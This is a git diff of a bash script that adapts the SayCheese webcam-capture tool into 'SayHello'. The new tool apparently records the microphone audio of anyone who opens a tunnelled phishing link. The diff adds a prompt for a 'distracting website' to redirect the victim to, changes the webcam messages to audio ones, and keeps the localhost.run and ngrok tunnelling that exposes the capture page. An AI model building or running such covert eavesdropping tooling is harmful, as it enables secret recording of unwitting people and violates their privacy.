@@ -1,23 +1,26 @@
 #!/bin/bash
-# SayCheese v1.0
-# coded by: github.com/thelinuxchoice/saycheese
-# If you use any part from this code, giving me the credits. Read the Lincense!
-
+# SayHello v1.0
+# coded by: github.com/thelinuxchoice/sayhello
+# Twitter: @linux_choice
+# Using Recorderjs by: https://github.com/mattdiamond/Recorderjs
 trap 'printf "\n";stop' 2
 
 banner() {
 
+ 
+printf "\e[1;92m                                          __ \e[0m\n"
+printf "\e[1;93m  ____              _   _      _ _ \e[0m\e[1;92m      /__\  \e[0m\n"
+printf "\e[1;93m / ___|  __ _ _   _| | | | ___| | | ___ \e[0m\e[1;92m \__/  \e[0m\n"
+printf "\e[1;93m \___ \ / _\` | | | | |_| |/ _ \ | |/ _ \ \e[0m\e[1;92m || \e[0m\n"
+printf "\e[1;93m  ___) | (_| | |_| |  _  |  __/ | | (_) | \e[0m\e[1;92m|| \e[0m\n"
+printf "\e[1;93m |____/ \__,_|\__, |_| |_|\___|_|_|\___/  \e[0m\e[1;92m|| \e[0m\n"
+printf "\e[1;93m              |___/                        \e[0m\e[1;92m\__ \e[0m\n"
+printf "\e[1;92m                                              \ \e[0m\n"
 
-printf "\e[1;92m  ____              \e[0m\e[1;77m ____ _                          \e[0m\n"
-printf "\e[1;92m / ___|  __ _ _   _ \e[0m\e[1;77m/ ___| |__   ___  ___  ___  ___  \e[0m\n"
-printf "\e[1;92m \___ \ / _\` | | | \e[0m\e[1;77m| |   | '_ \ / _ \/ _ \/ __|/ _ \ \e[0m\n"
-printf "\e[1;92m  ___) | (_| | |_| |\e[0m\e[1;77m |___| | | |  __/  __/\__ \  __/ \e[0m\n"
-printf "\e[1;92m |____/ \__,_|\__, |\e[0m\e[1;77m\____|_| |_|\___|\___||___/\___| \e[0m\n"
-printf "\e[1;92m              |___/ \e[0m                                 \n"
 
-printf " \e[1;77m v1.0 coded by github.com/thelinuxchoice/saycheese\e[0m \n"
+printf "\e[1;77m v1.0 coded by github.com/thelinuxchoice/sayhello\e[0m \n"
 
-printf "\n"
+printf " Twitter: @linux_choice\n"
 
 
 }
@@ -79,7 +82,7 @@ fi
 sleep 0.5
 
 if [[ -e "Log.log" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Audio file received!\e[0m\n"
 rm -rf Log.log
 fi
 sleep 0.5
@@ -93,7 +96,7 @@ server() {
 
 command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
 
-printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Localhost.run...\e[0m\n"
+printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Localhost.run connection...\e[0m\n"
 
 if [[ $checkphp == *'php'* ]]; then
 killall -2 php > /dev/null 2>&1
@@ -107,7 +110,7 @@ sleep 8
 else
 $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 localhost.run 2> /dev/null > sendlink ' &
 
-sleep 1
+sleep 8
 fi
 printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
 fuser -k 3333/tcp > /dev/null 2>&1
@@ -122,8 +125,8 @@ printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $s
 payload_ngrok() {
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-sed 's+forwarding_link+'$link'+g' saycheese.html > index2.html
 sed 's+forwarding_link+'$link'+g' template.php > index.php
+sed 's+redirect_link+'$redirect_link'+g' js/_app.js > js/app.js
 
 
 }
@@ -134,7 +137,7 @@ ngrok_server() {
 if [[ -e ngrok ]]; then
 echo ""
 elif [[ -e $PREFIX/bin/ngrok ]]; then
-	ln -s $PREFIX/bin/ngork $PWD/ngrok
+	ln -s $PREFIX/bin/ngrok $PWD/ngrok
 else
 command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
 command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
@@ -191,6 +194,12 @@ printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
 default_option_server="1"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
 option_server="${option_server:-${default_option_server}}"
+
+default_redirect="https://youtube.com"
+printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a distracting website (Default:\e[0m\e[1;77m %s\e[0m\e[1;92m ): \e[0m" $default_redirect
+read redirect_link
+redirect_link="${redirect_link:-${default_redirect}}"
+
 if [[ $option_server -eq 1 ]]; then
 
 command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
@@ -212,8 +221,9 @@ payload() {
 
 send_link=$(grep -o "https://$(whoami)-[0-9a-z]*\.localhost.run" sendlink)
 
-sed 's+forwarding_link+'$send_link'+g' saycheese.html > index2.html
+
 sed 's+forwarding_link+'$send_link'+g' template.php > index.php
+sed 's+redirect_link+'$redirect_link'+g' js/_app.js > js/app.js
 
 
 }
@@ -221,14 +231,14 @@ sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 start() {
 
 default_choose_sub="Y"
-default_subdomain="saycheese$RANDOM"
+default_subdomain="sayhello$RANDOM"
 
-printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
+printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? \e[0m\e[1;77m [Y/n] \e[0m\e[1;33m: \e[0m'
 read choose_sub
 choose_sub="${choose_sub:-${default_choose_sub}}"
 if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
 subdomain_resp=true
-printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
+printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
 read subdomain
 subdomain="${subdomain:-${default_subdomain}}"
 fi
